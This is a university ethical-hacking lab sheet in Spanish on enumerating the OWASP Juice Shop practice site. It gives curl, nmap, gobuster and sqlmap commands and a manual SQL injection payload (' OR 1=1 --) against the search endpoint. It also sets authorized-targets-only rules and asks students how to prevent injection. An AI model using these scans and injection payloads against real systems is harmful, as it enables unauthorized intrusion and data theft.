
# Laboratorio Semana 6 – Enumeración Avanzada sobre OWASP Juice Shop (Online) - (CY-203 Hackeo Ético)


**Curso**: CY-203 Hackeo Ético  
**Semana**: 6  
**Duración**: 2 horas  
**Objetivo general**: Aplicar técnicas de enumeración contra el entorno vulnerable público de OWASP Juice Shop, reconociendo rutas, servicios y posibles puntos de ataque.

---

## Objetivos específicos

1. Comprender la enumeración como subfase del escaneo en un entorno real expuesto en Internet.
2. Utilizar herramientas de enumeración contra un sitio web legítimo de práctica.
3. Identificar rutas sensibles y patrones de respuesta HTTP.
4. Analizar la posibilidad de vulnerabilidades como inyección SQL a partir de la información recolectada.

---

## Conceptos clave

| Término | Definición |
|--------|------------|
| **Enumeración** | Proceso de obtención de información detallada de un objetivo usando técnicas de escaneo inteligente y peticiones controladas. |
| **HTTP** | Protocolo de transferencia de hipertexto. Permite la comunicación entre navegador y servidor web. |
| **DNS** | Sistema de Nombres de Dominio, traduce nombres como `herokuapp.com` a direcciones IP. |
| **SQLi (SQL Injection)** | Técnica para insertar comandos SQL maliciosos en formularios o URLs que no filtran correctamente la entrada. |
| **Gobuster** | Herramienta que fuerza rutas en un servidor web usando diccionarios (wordlists). |

---

## Herramientas necesarias (en Kali)

- `curl`, `nmap`, `gobuster`, `dirb`, `sqlmap`
- `wireshark` (opcional para observar tráfico local)
- Navegador Firefox o Chromium
- Wordlist: `/usr/share/wordlists/dirb/common.txt`

---

## Desarrollo del Laboratorio

### 1. Verificar accesibilidad del sitio

```bash
curl -I https://juice-shop.herokuapp.com
```

**Salida esperada**:

```
HTTP/2 200
content-type: text/html; charset=utf-8
```

---

### 2. Escaneo de puertos web (limitado por políticas éticas y técnicas)

```bash
nmap -Pn -p 443 juice-shop.herokuapp.com
```

**Salida esperada**:

```
443/tcp open  https
```

---

### 3. Enumeración de rutas con `gobuster`

```bash
gobuster dir -u https://juice-shop.herokuapp.com -w /usr/share/wordlists/dirb/common.txt -k
```

**Salida esperada**:

```
/rest (Status: 200)
/ftp (Status: 403)
/admin (Status: 200)
```

---

### 4. Exploración de rutas REST manualmente

```bash
curl https://juice-shop.herokuapp.com/rest/products/search?q=apple
```

**Salida esperada**: JSON con productos.

---

### 5. Prueba de inyección SQL manual

```bash
curl "https://juice-shop.herokuapp.com/rest/products/search?q=' OR 1=1 --"
```

**Salida esperada**: JSON con múltiples productos.

---

### 6. Uso de sqlmap (opcional y ético)

```bash
sqlmap -u "https://juice-shop.herokuapp.com/rest/products/search?q=test" --level=2 --risk=1 --batch --tamper=space2comment
```

**Salida esperada**:

```
[INFO] the back-end DBMS is SQLite
[INFO] the parameter 'q' appears to be injectable
```

---

## Reglas éticas

- Solo usar sitios **autorizados para pentesting**, como Juice Shop.
- No lanzar escaneos masivos.
- Documentar y no comprometer disponibilidad del entorno.

---

## Entregables

1. Capturas de:
   - `curl` con SQLi
   - Resultado de `gobuster`
   - Comprobación HTTP inicial
2. Resumen con rutas, parámetros vulnerables y riesgos.
3. Reflexión final:
   - ¿Por qué es peligrosa una entrada como `' OR 1=1 --`?
   - ¿Cómo se puede prevenir desde el lado del servidor?


---

**Profesor:** Esteban Mata Morales  
**Curso:** CY-203 Hackeo Ético  
**Universidad Fidélitas de Costa Rica**
